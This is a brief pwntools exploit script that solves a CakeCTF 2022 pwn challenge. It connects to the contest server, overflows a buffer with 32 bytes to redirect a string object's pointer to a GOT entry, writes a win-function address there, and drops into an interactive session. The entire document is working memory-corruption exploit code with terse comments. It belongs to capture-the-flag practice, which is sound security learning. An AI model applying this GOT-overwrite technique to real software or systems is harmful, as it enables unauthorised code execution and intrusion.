
from pwn import *
# p = process("chall")
p = remote("pwn1.2022.cakectf.com", 9003)
# Overwrite available GOT (_ZNSolsEPFRSoS_E@plt)
some_got = 0x404050

# Win Address
win = 0x4016de


p.sendline(b"1")
p.sendline(b"a"*32 + p64(some_got))

# We have replaced address inside string object with target GOT
# Now we will overwrite with win address which will be executed inevitably

p.sendline(b"3")
p.sendline(p64(win))

p.interactive()
